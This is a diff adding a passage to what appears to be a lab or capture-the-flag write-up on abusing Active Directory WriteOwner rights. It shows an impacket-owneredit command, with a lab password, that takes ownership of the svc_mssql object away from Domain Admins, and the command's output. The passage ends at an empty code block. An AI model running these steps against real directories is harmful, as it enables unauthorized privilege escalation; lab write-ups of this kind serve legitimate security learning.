@@ -441,3 +441,21 @@ My newly compromised user `milo.w` has WriteOwner on `svc_mssql`
 
 To abuse this ill grant ownership over the object then give myself full control (GenericAll) over the object
 
+https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
+
+```python
+impacket-owneredit -action write -new-owner 'milo.w' -target-dn 'CN=SVC_MSSQL,CN=USERS,DC=SHADOWGATE,DC=LOCAL' 'shadowgate.local'/'milo.w':'Password123!' -dc-ip 10.1.232.232
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-2396436576-3267128377-3646372360-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=shadowgate,DC=local
+[*] OwnerSid modified successfully!
+```
+
+First ill grant owndership over the object
+
+```python
+
+```
